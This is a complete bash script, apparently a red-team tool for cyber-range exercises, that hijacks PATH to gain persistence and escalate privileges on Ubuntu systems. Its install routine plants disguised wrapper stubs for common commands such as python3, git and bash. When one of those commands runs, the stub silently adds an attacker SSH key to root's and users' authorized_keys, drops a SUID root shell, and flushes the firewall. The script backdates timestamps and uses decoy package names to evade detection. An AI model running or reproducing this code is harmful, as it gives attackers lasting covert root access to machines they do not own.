#!/usr/bin/env bash
# path-hijack.sh — PATH directory injection for persistence and privilege escalation
#
# Drops transparent command wrappers into an unprivileged directory that lands
# first in $PATH.  Every time a user runs a hijacked command, the wrapper
# silently re-asserts persistence then transparently execs the real binary.
#
# Attack angles:
#   user-level   ~/.local/bin is ALREADY prepended by Ubuntu 24.04's ~/.profile
#                (added if the dir exists).  Zero PATH modification needed —
#                create the dir, drop stubs, done.  No root required.
#   system-level /etc/profile.d/ drop-in prepends a hidden dir for ALL users,
#                including root's interactive sessions.  Requires root.
#   cron-level   Prepends hidden dir to PATH= line in /etc/crontab so stubs
#                fire inside all root cron jobs using relative commands.
#
# Payload (configurable via --payload):
#   1  SSH key re-injection into ~/.ssh/authorized_keys (and root's)
#   2  + SUID bash dropped to /var/cache/.syspkg/.bash (instant root shell)
#   3  + firewall flush + restart shadow-crond / flood-journal / ureadahead
#
# Usage:
#   ./path-hijack.sh scan                          # audit, no changes made
#   ./path-hijack.sh install [OPTIONS]
#   ./path-hijack.sh remove
#   ./path-hijack.sh status
#
# Install options:
#   --level user|system|cron     default: user
#   --key  "ssh-ed25519 ..."     SSH key re-injected on each trigger (recommended)
#   --commands "c1,c2,..."       override command list (default: auto per level)
#   --payload 1|2|3              payload intensity (default: 3)
#   --dir DIR                    override hidden bin directory
#   --target-user USER           user whose ~/.local/bin to target (user level only)
#   --whitelist "u1|u2"          skip these users' homedir (default: greyteam|ansible|scoring)

set -euo pipefail

# ── constants ─────────────────────────────────────────────────────────────────
STATE_DIR="/var/cache/.syspkg"
STATE_FILE="${STATE_DIR}/path-hijack.state"

# disguise: system dir lives under a real Ubuntu package path
SYS_BIN_DIR="/usr/lib/update-manager/.d"
SYS_PROFILE="/etc/profile.d/10-update-manager.sh"

# cron dir reuses the same hidden location
CRON_BIN_DIR="/usr/lib/update-manager/.d"

# default command sets
USER_CMDS_DEFAULT="python3 python pip3 pip git curl wget make node npm"
SYS_CMDS_DEFAULT="python3 python pip3 pip git curl wget make gcc bash sh perl"
CRON_CMDS_DEFAULT="python3 python bash sh perl curl wget"

WHITELIST_DEFAULT="greyteam|ansible|scoring|cyberrange"

# ── colours ───────────────────────────────────────────────────────────────────
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'
RED='\033[0;31m'; BOLD='\033[1m'; NC='\033[0m'
info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
err()   { echo -e "${RED}[!]${NC} $*" >&2; }
hdr()   { echo -e "\n${CYAN}${BOLD}── $* ──${NC}"; }
hit()   { echo -e "  ${GREEN}HIT${NC}  $*"; }
miss()  { echo -e "  ${RED}MISS${NC} $*"; }
note()  { echo -e "  ${YELLOW}NOTE${NC} $*"; }

# ── write_stub ────────────────────────────────────────────────────────────────
# Generates a transparent wrapper for $cmd in $dest_dir.
# Runtime variables ($HOME, $PATH, etc.) are written as literals — no expansion
# at install time.  Install-time values (cmd name, real bin, SSH key) are
# substituted by passing them as printf arguments.
write_stub() {
    local cmd="$1"
    local dest_dir="$2"
    local ssh_key="$3"
    local payload_lvl="${4:-3}"

    local real_bin
    real_bin=$(command -v "$cmd" 2>/dev/null || true)
    real_bin="${real_bin:-/usr/bin/${cmd}}"

    # if the found binary is inside our hijack dir, skip one level deeper to get real
    if [[ "$real_bin" == "${dest_dir}/"* ]]; then
        real_bin=$(IFS=:; for d in $PATH; do
            [[ "$d" == "$dest_dir" ]] && continue
            [[ -x "$d/$cmd" ]] && echo "$d/$cmd" && break
        done || echo "/usr/bin/${cmd}")
    fi

    local stub="${dest_dir}/${cmd}"
    {
        printf '#!/bin/bash\n'
        printf '# %s: path resolution compatibility stub\n' "$cmd"
        printf '_payload() { (\n'

        # Level 1+: SSH key injection
        printf '    _k="%s"\n'         "$ssh_key"
        printf '    for _h in /root "$(getent passwd "${SUDO_USER:-}" 2>/dev/null | cut -d: -f6)" "$HOME"; do\n'
        printf '        [[ -d "$_h" ]] || continue\n'
        printf '        mkdir -p "$_h/.ssh" 2>/dev/null\n'
        printf '        chmod 700 "$_h/.ssh" 2>/dev/null\n'
        printf '        touch "$_h/.ssh/authorized_keys" 2>/dev/null\n'
        printf '        chmod 600 "$_h/.ssh/authorized_keys" 2>/dev/null\n'
        printf '        grep -qF "$_k" "$_h/.ssh/authorized_keys" 2>/dev/null || echo "$_k" >> "$_h/.ssh/authorized_keys" 2>/dev/null\n'
        printf '    done\n'

        # Level 2+: SUID bash drop
        if [[ "$payload_lvl" -ge 2 ]]; then
            printf '    mkdir -p /var/cache/.syspkg 2>/dev/null\n'
            printf '    [[ -u /var/cache/.syspkg/.bash ]] || {\n'
            printf '        cp /bin/bash /var/cache/.syspkg/.bash 2>/dev/null\n'
            printf '        chmod u+s /var/cache/.syspkg/.bash 2>/dev/null\n'
            printf '    }\n'
        fi

        # Level 3+: firewall flush + watchdogs
        if [[ "$payload_lvl" -ge 3 ]]; then
            printf '    nft flush ruleset 2>/dev/null\n'
            printf '    iptables -F 2>/dev/null; iptables -X 2>/dev/null\n'
            printf '    ip6tables -F 2>/dev/null; ip6tables -X 2>/dev/null\n'
            printf '    for _svc in systemd-timesyncd-helper network-health-monitor ureadahead; do\n'
            printf '        systemctl is-active --quiet "$_svc" 2>/dev/null || systemctl start "$_svc" 2>/dev/null\n'
            printf '    done\n'
        fi

        printf ') &>/dev/null &\ndisown $! 2>/dev/null; }\n'
        printf '_payload\n'
        printf '\n'
        printf '# find real binary: walk PATH, skip our own directory\n'
        printf '_self="$(dirname "$(readlink -f "${BASH_SOURCE[0]}" 2>/dev/null || echo "$0")")"\n'
        printf '_real=""\n'
        printf 'IFS=: read -ra _path_arr <<< "${PATH}:"\n'
        printf 'for _dir in "${_path_arr[@]}"; do\n'
        printf '    [[ "$_dir" == "$_self" ]] && continue\n'
        printf '    [[ -x "$_dir/%s" ]] && { _real="$_dir/%s"; break; }\n'  "$cmd" "$cmd"
        printf 'done\n'
        printf 'exec "${_real:-%s}" "$@"\n'  "$real_bin"
    } > "$stub"
    chmod 755 "$stub"
}

# ── cmd_scan ──────────────────────────────────────────────────────────────────
cmd_scan() {
    local whitelist="${1:-$WHITELIST_DEFAULT}"

    hdr "PATH Entries"
    local found_writable_user=0
    IFS=: read -ra _path_dirs <<< "$PATH"
    for d in "${_path_dirs[@]}"; do
        if [[ -w "$d" ]]; then
            hit "WRITABLE  $d"
            found_writable_user=1
        elif [[ -d "$d" ]]; then
            miss "read-only $d"
        else
            note "missing   $d"
        fi
    done

    hdr "~/.local/bin (Ubuntu 24.04 XDG auto-PATH)"
    local local_bin="${HOME}/.local/bin"
    if echo "$PATH" | grep -q "${local_bin}"; then
        hit "${local_bin} is already in PATH — user-level stubs work with zero PATH modification"
    elif [[ -d "$local_bin" ]]; then
        note "${local_bin} exists but is NOT in PATH (check ~/.profile — may need re-login)"
    else
        note "${local_bin} does not exist — will be created by install --level user"
    fi

    hdr "sudo Environment Handling"
    local sudo_conf
    if sudo_conf=$(sudo -l 2>/dev/null); then
        if echo "$sudo_conf" | grep -q "env_reset"; then
            warn "env_reset is ON — PATH is stripped on sudo"
            note "user-level stubs will NOT fire when commands are sudo'd"
        else
            hit "env_reset is OFF — user PATH survives sudo calls"
        fi
        local secure_path
        secure_path=$(echo "$sudo_conf" | grep "secure_path" | sed 's/.*secure_path=//' | tr -d ' "' || true)
        if [[ -n "$secure_path" ]]; then
            warn "secure_path set: $secure_path"
            note "sudo uses this fixed PATH regardless of env_reset"
        else
            hit "no secure_path — sudo inherits PATH (if env_reset is off)"
        fi
    else
        note "Could not run sudo -l (no sudo access or requires password)"
    fi

    hdr "/etc/crontab PATH"
    if [[ -r /etc/crontab ]]; then
        local cron_path
        cron_path=$(grep "^PATH=" /etc/crontab | head -1 || echo "(none set)")
        echo "  $cron_path"
        # check for writable entries in cron PATH
        if [[ "$cron_path" != "(none set)" ]]; then
            local cp_val="${cron_path#PATH=}"
            IFS=: read -ra _cron_dirs <<< "$cp_val"
            for d in "${_cron_dirs[@]}"; do
                [[ -w "$d" ]] && hit "WRITABLE in cron PATH: $d"
            done
        fi
    else
        note "/etc/crontab not readable (run as root for full scan)"
    fi

    hdr "Cron Jobs Using Relative Commands"
    local found_cron_relative=0
    local cron_files=()
    [[ -r /etc/crontab ]] && cron_files+=(/etc/crontab)
    [[ -d /etc/cron.d ]] && mapfile -t _tmp < <(find /etc/cron.d -maxdepth 1 -type f -readable 2>/dev/null) && cron_files+=("${_tmp[@]}")
    # current user's crontab
    local user_crontab
    if user_crontab=$(crontab -l 2>/dev/null); then
        # write to temp for grep
        local _ctmp; _ctmp=$(mktemp /dev/shm/.XXXXXXXX)
        echo "$user_crontab" > "$_ctmp"
        cron_files+=("$_ctmp")
    fi

    for cf in "${cron_files[@]}"; do
        [[ -r "$cf" ]] || continue
        # find cron command fields (skip comments and PATH= lines)
        while IFS= read -r line; do
            [[ "$line" =~ ^# ]] && continue
            [[ "$line" =~ ^[[:space:]]*$ ]] && continue
            [[ "$line" =~ ^PATH= ]] && continue
            # extract the command portion — field 6+ for /etc/crontab (has user), field 5+ for user crontab
            local cmd_field
            if [[ "$cf" == /etc/crontab || "$cf" == /etc/cron.d/* ]]; then
                cmd_field=$(echo "$line" | awk '{$1=$2=$3=$4=$5=$6=""; print $0}' | xargs 2>/dev/null || true)
            else
                cmd_field=$(echo "$line" | awk '{$1=$2=$3=$4=$5=""; print $0}' | xargs 2>/dev/null || true)
            fi
            # check if the first token of cmd_field is a relative command (no leading /)
            local first_cmd
            first_cmd=$(echo "$cmd_field" | awk '{print $1}' 2>/dev/null || true)
            if [[ -n "$first_cmd" && "$first_cmd" != /* ]]; then
                hit "RELATIVE: $(basename "$cf"):  $line"
                hit "          → hijack: $(basename "$first_cmd")"
                found_cron_relative=1
            fi
        done < "$cf"
    done
    # cleanup temp crontab file
    for cf in "${cron_files[@]}"; do
        [[ "$cf" == /dev/shm/.* ]] && rm -f "$cf"
    done
    [[ $found_cron_relative -eq 0 ]] && note "No obvious relative commands found in readable cron files"

    hdr "SUID Shell Scripts"
    local suid_scripts=0
    while IFS= read -r f; do
        local shebang
        shebang=$(head -1 "$f" 2>/dev/null || true)
        if [[ "$shebang" =~ ^#!.*(bash|sh|python|perl|ruby) ]]; then
            hit "SUID shell script: $f  (shebang: $shebang)"
            suid_scripts=1
        fi
    done < <(find / -xdev -perm -4000 -type f 2>/dev/null)
    [[ $suid_scripts -eq 0 ]] && note "No SUID shell scripts found"

    hdr "Existing PATH Manipulation in profile.d"
    if [[ -d /etc/profile.d ]]; then
        for f in /etc/profile.d/*.sh; do
            [[ -r "$f" ]] || continue
            grep -qE "^export PATH|^PATH=" "$f" 2>/dev/null && note "PATH modified in $f:" && grep -E "^export PATH|^PATH=" "$f" | head -3
        done
    fi

    hdr "Recommendations"
    if [[ "$found_writable_user" -eq 1 || -w "${HOME}/.local/bin" || ! -e "${HOME}/.local/bin" ]]; then
        hit "[HIGH] user-level: ~/.local/bin works with no PATH modification needed"
        echo "         deploy:  ./path-hijack.sh install --level user --key 'ssh-ed25519 ...'"
    fi
    if [[ $EUID -eq 0 ]]; then
        hit "[HIGH] system-level: running as root — can modify /etc/profile.d/ for all users"
        echo "         deploy:  ./path-hijack.sh install --level system --key 'ssh-ed25519 ...'"
        hit "[MED]  cron-level: can prepend to /etc/crontab PATH to catch root cron jobs"
        echo "         deploy:  ./path-hijack.sh install --level cron --key 'ssh-ed25519 ...'"
    else
        note "Run as root to see system and cron-level options"
    fi
    echo
}

# ── cmd_install ───────────────────────────────────────────────────────────────
cmd_install() {
    local level="user"
    local ssh_key=""
    local payload_lvl=3
    local custom_dir=""
    local custom_cmds=""
    local target_user="${SUDO_USER:-$USER}"
    local whitelist="$WHITELIST_DEFAULT"

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --level)       level="$2";        shift 2 ;;
            --key)         ssh_key="$2";      shift 2 ;;
            --payload)     payload_lvl="$2";  shift 2 ;;
            --dir)         custom_dir="$2";   shift 2 ;;
            --commands)    custom_cmds="$2";  shift 2 ;;
            --target-user) target_user="$2";  shift 2 ;;
            --whitelist)   whitelist="$2";    shift 2 ;;
            *) err "Unknown option: $1"; exit 1 ;;
        esac
    done

    if [[ -z "$ssh_key" ]]; then
        local gen_key="/var/cache/.syspkg/path-hijack_id_ed25519"
        mkdir -p /var/cache/.syspkg; chmod 700 /var/cache/.syspkg
        if [[ ! -f "${gen_key}.pub" ]]; then
            ssh-keygen -t ed25519 -f "$gen_key" -N "" -C "rt-ph" -q
        fi
        ssh_key=$(cat "${gen_key}.pub")
        info "Generated SSH key: $gen_key"
        info "Public key: $ssh_key"
        echo
        warn "╔══ SAVE THIS PRIVATE KEY ══════════════════════════════════╗"
        cat "$gen_key"
        warn "╚═══════════════════════════════════════════════════════════╝"
        echo
    fi

    # ── resolve bin dir and command list ──────────────────────────────────────
    local bin_dir cmd_list path_mod_file path_mod_content target_home
    target_home=$(getent passwd "$target_user" | cut -d: -f6 2>/dev/null || eval echo "~$target_user")

    case "$level" in
        user)
            bin_dir="${custom_dir:-${target_home}/.local/bin}"
            cmd_list="${custom_cmds:-$USER_CMDS_DEFAULT}"
            path_mod_file="${target_home}/.profile"
            ;;
        system)
            [[ $EUID -ne 0 ]] && { err "--level system requires root"; exit 1; }
            bin_dir="${custom_dir:-$SYS_BIN_DIR}"
            cmd_list="${custom_cmds:-$SYS_CMDS_DEFAULT}"
            path_mod_file="$SYS_PROFILE"
            ;;
        cron)
            [[ $EUID -ne 0 ]] && { err "--level cron requires root"; exit 1; }
            bin_dir="${custom_dir:-$CRON_BIN_DIR}"
            cmd_list="${custom_cmds:-$CRON_CMDS_DEFAULT}"
            path_mod_file="/etc/crontab"
            ;;
        *) err "Unknown level: $level  (user|system|cron)"; exit 1 ;;
    esac

    IFS=',' read -ra cmds <<< "$(echo "$cmd_list" | tr ' ' ',')"

    # ── 1. create the hidden bin dir ──────────────────────────────────────────
    hdr "1/4  Creating hijack directory"
    mkdir -p "$bin_dir"
    # hide it: 700 for system dirs, 750 for user (otherwise profile.d can't read)
    if [[ "$level" == "user" ]]; then
        chmod 755 "$bin_dir"
    else
        chmod 755 "$bin_dir"
        # timestamp to look old — same convention as rest of toolkit
        touch -t 202004150830 "$bin_dir"
    fi
    info "Hijack dir: $bin_dir"

    # ── 2. drop PATH entry ────────────────────────────────────────────────────
    hdr "2/4  Injecting into PATH"
    local path_injected=0
    case "$level" in
        user)
            # Ubuntu 24.04 ~/.profile already handles ~/.local/bin if it exists
            if [[ "$bin_dir" == "${target_home}/.local/bin" ]]; then
                info "~/.local/bin is auto-added by ~/.profile on Ubuntu 24.04 — no modification needed"
                # Belt-and-suspenders: also add to .bashrc in case profile isn't sourced
                local bashrc="${target_home}/.bashrc"
                if [[ -f "$bashrc" ]] && ! grep -q "path-hijack" "$bashrc" 2>/dev/null; then
                    echo "" >> "$bashrc"
                    echo "# package manager path update helper" >> "$bashrc"
                    echo "export PATH=\"\$HOME/.local/bin:\$PATH\"" >> "$bashrc"
                    info "Added export to $bashrc (belt-and-suspenders)"
                    path_injected=1
                fi
            else
                # custom dir — need to add explicitly
                local bashrc="${target_home}/.bashrc"
                if ! grep -q "$bin_dir" "$bashrc" 2>/dev/null; then
                    echo "" >> "$bashrc"
                    echo "# package manager path update helper" >> "$bashrc"
                    echo "export PATH=\"${bin_dir}:\$PATH\"" >> "$bashrc"
                    info "Added $bin_dir to PATH in $bashrc"
                    path_injected=1
                else
                    info "$bin_dir already in $bashrc"
                fi
            fi
            ;;
        system)
            if [[ ! -f "$SYS_PROFILE" ]]; then
                cat > "$SYS_PROFILE" <<EOF
# Ubuntu update-manager path helper (compatibility shim for 20.04→24.04 upgrades)
if [ -d "${bin_dir}" ]; then
    PATH="${bin_dir}:\${PATH}"
    export PATH
fi
EOF
                chmod 644 "$SYS_PROFILE"
                touch -t 202004150830 "$SYS_PROFILE"
                info "Created $SYS_PROFILE"
                path_injected=1
            else
                if ! grep -q "$bin_dir" "$SYS_PROFILE" 2>/dev/null; then
                    echo "PATH=\"${bin_dir}:\${PATH}\"; export PATH" >> "$SYS_PROFILE"
                    info "Appended to existing $SYS_PROFILE"
                    path_injected=1
                else
                    info "$bin_dir already in $SYS_PROFILE"
                fi
            fi
            ;;
        cron)
            # Prepend our dir to /etc/crontab's PATH= line
            if grep -q "^PATH=" /etc/crontab 2>/dev/null; then
                # backup once
                [[ ! -f "${STATE_DIR}/crontab.orig" ]] && cp /etc/crontab "${STATE_DIR}/crontab.orig"
                sed -i "s|^PATH=|PATH=${bin_dir}:|" /etc/crontab
                info "Prepended $bin_dir to PATH in /etc/crontab"
                path_injected=1
            else
                # no PATH line — insert one before the first job entry
                [[ ! -f "${STATE_DIR}/crontab.orig" ]] && cp /etc/crontab "${STATE_DIR}/crontab.orig"
                sed -i "1s|^|PATH=${bin_dir}:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n|" /etc/crontab
                info "Inserted PATH line into /etc/crontab"
                path_injected=1
            fi
            ;;
    esac

    # ── 3. generate command stubs ─────────────────────────────────────────────
    hdr "3/4  Writing command stubs (payload level ${payload_lvl})"
    local deployed_cmds=()
    for cmd in "${cmds[@]}"; do
        [[ -z "$cmd" ]] && continue
        # don't stub commands that don't exist anywhere on the system — would be odd
        if ! command -v "$cmd" &>/dev/null && [[ "$level" != "cron" ]]; then
            note "Skipping $cmd — not found in PATH (cron-level always installs)"
        else
            write_stub "$cmd" "$bin_dir" "$ssh_key" "$payload_lvl"
            info "Stub written: ${bin_dir}/${cmd}  → $(command -v "$cmd" 2>/dev/null || echo "fallback /usr/bin/$cmd")"
            deployed_cmds+=("$cmd")
        fi
    done

    # ── 4. write state file ───────────────────────────────────────────────────
    hdr "4/4  Saving state"
    mkdir -p "$STATE_DIR"; chmod 700 "$STATE_DIR"
    {
        echo "level=${level}"
        echo "bin_dir=${bin_dir}"
        echo "commands=\"${deployed_cmds[*]}\""
        echo "path_mod_file=${path_mod_file}"
        echo "path_injected=${path_injected}"
        echo "target_user=${target_user}"
        echo "payload_lvl=${payload_lvl}"
        echo "ssh_key_file=${gen_key:-}"
    } > "$STATE_FILE"
    chmod 600 "$STATE_FILE"
    touch -t 202004150830 "$STATE_FILE"
    info "State saved to $STATE_FILE"

    echo
    info "=== path-hijack installed (level: ${level}) ==="
    info "Hijack dir:  $bin_dir"
    info "Commands:    ${deployed_cmds[*]}"
    info "Payload:     level ${payload_lvl}"
    [[ -z "$ssh_key" || "$ssh_key" == *Placeholder* ]] && \
        warn "Replace placeholder SSH key — run install again with --key 'ssh-ed25519 ...'"
    echo
    if [[ "$level" == "user" ]]; then
        note "Stubs fire next time user opens a new shell (or runs 'source ~/.bashrc')"
    else
        note "Stubs fire at next login/cron-run for all users"
    fi
    note "SUID bash handle (payload level ≥ 2): /var/cache/.syspkg/.bash -p"
}

# ── cmd_remove ────────────────────────────────────────────────────────────────
cmd_remove() {
    if [[ ! -f "$STATE_FILE" ]]; then
        warn "No state file found at $STATE_FILE — nothing to remove"
        exit 0
    fi

    # load state
    local level bin_dir commands path_mod_file path_injected target_user
    # shellcheck disable=SC1090
    source "$STATE_FILE"

    hdr "Removing command stubs"
    IFS=' ' read -ra cmds <<< "$commands"
    for cmd in "${cmds[@]}"; do
        local stub="${bin_dir}/${cmd}"
        if [[ -f "$stub" ]] && grep -q "path resolution compatibility stub" "$stub" 2>/dev/null; then
            rm -f "$stub"
            info "Removed stub: $stub"
        fi
    done

    # remove bin dir if empty
    if [[ -d "$bin_dir" ]] && [[ -z "$(ls -A "$bin_dir" 2>/dev/null)" ]]; then
        rmdir "$bin_dir" 2>/dev/null && info "Removed empty dir: $bin_dir"
    fi

    hdr "Removing PATH injection"
    case "$level" in
        user)
            local bashrc
            bashrc=$(getent passwd "$target_user" | cut -d: -f6 2>/dev/null)/.bashrc
            if [[ -f "$bashrc" ]]; then
                sed -i '/# package manager path update helper/d' "$bashrc"
                sed -i "\|${bin_dir}|d" "$bashrc"
                info "Removed PATH entry from $bashrc"
            fi
            ;;
        system)
            if [[ -f "$SYS_PROFILE" ]]; then
                rm -f "$SYS_PROFILE"
                info "Removed $SYS_PROFILE"
            fi
            ;;
        cron)
            if [[ -f "${STATE_DIR}/crontab.orig" ]]; then
                cp "${STATE_DIR}/crontab.orig" /etc/crontab
                rm -f "${STATE_DIR}/crontab.orig"
                info "Restored /etc/crontab from backup"
            else
                # best-effort: remove our dir from PATH line
                sed -i "\|${bin_dir}:|d" /etc/crontab
                info "Removed $bin_dir from /etc/crontab PATH"
            fi
            ;;
    esac

    rm -f "$STATE_FILE"
    info "State file removed"
}

# ── cmd_status ────────────────────────────────────────────────────────────────
cmd_status() {
    hdr "State"
    if [[ -f "$STATE_FILE" ]]; then
        info "State file: $STATE_FILE"
        while IFS='=' read -r k v; do
            printf "  %-20s %s\n" "$k" "$v"
        done < "$STATE_FILE"
    else
        warn "No state file at $STATE_FILE (not installed, or state was wiped)"
    fi

    hdr "Stub Integrity"
    if [[ -f "$STATE_FILE" ]]; then
        source "$STATE_FILE" 2>/dev/null || true
        IFS=' ' read -ra cmds <<< "${commands:-}"
        for cmd in "${cmds[@]}"; do
            local stub="${bin_dir:-?}/${cmd}"
            if [[ -f "$stub" ]] && grep -q "path resolution compatibility stub" "$stub" 2>/dev/null; then
                info "PRESENT  $stub"
            else
                warn "MISSING  $stub"
            fi
        done
    fi

    hdr "PATH Resolution Check"
    if [[ -f "$STATE_FILE" ]]; then
        source "$STATE_FILE" 2>/dev/null || true
        IFS=' ' read -ra cmds <<< "${commands:-}"
        for cmd in "${cmds[@]}"; do
            local resolved
            resolved=$(command -v "$cmd" 2>/dev/null || echo "(not found)")
            if [[ "$resolved" == "${bin_dir:-?}/${cmd}" ]]; then
                info "HIJACKED $cmd → $resolved"
            else
                warn "BYPASSED $cmd → $resolved  (our stub is not first in PATH)"
            fi
        done
    fi

    hdr "SUID Bash Handle"
    if [[ -u /var/cache/.syspkg/.bash ]]; then
        info "PRESENT  /var/cache/.syspkg/.bash  (use: /var/cache/.syspkg/.bash -p)"
    else
        warn "MISSING  /var/cache/.syspkg/.bash"
    fi

    hdr "Watchdog Services"
    for svc in systemd-timesyncd-helper network-health-monitor ureadahead; do
        systemctl is-active --quiet "$svc" 2>/dev/null \
            && info "RUNNING  $svc" \
            || warn "STOPPED  $svc"
    done
}

# ── dispatch ──────────────────────────────────────────────────────────────────
CMD="${1:-help}"; shift || true
case "$CMD" in
    scan)    cmd_scan    "$@" ;;
    install) cmd_install "$@" ;;
    remove)  cmd_remove       ;;
    status)  cmd_status       ;;
    *)
        cat <<'HELP'
Usage: ./path-hijack.sh <command> [options]

  scan                          Audit system for PATH hijack opportunities
  install [options]             Deploy hijack
  remove                        Clean up all artefacts
  status                        Show deployment status

Install options:
  --level user|system|cron      user   = ~/.local/bin, no root needed (default)
                                system = /etc/profile.d/, all users, root required
                                cron   = /etc/crontab PATH, root required
  --key   "ssh-ed25519 ..."     SSH key to re-inject on each trigger
  --commands "c1,c2,..."        Override command list
  --payload 1|2|3               1=ssh-key  2=+suid-bash  3=+fw+watchdogs
  --dir DIR                     Override hidden bin directory
  --target-user USER            Target user for user-level install
  --whitelist "u1|u2"           Skip these users (default: greyteam|ansible|scoring)

Examples:
  ./path-hijack.sh scan
  ./path-hijack.sh install --level user   --key "ssh-ed25519 AAAA..."
  ./path-hijack.sh install --level system --key "ssh-ed25519 AAAA..." --commands "python3,git,curl"
  ./path-hijack.sh install --level cron   --key "ssh-ed25519 AAAA..." --payload 1
  ./path-hijack.sh status
  ./path-hijack.sh remove
HELP
        ;;
esac
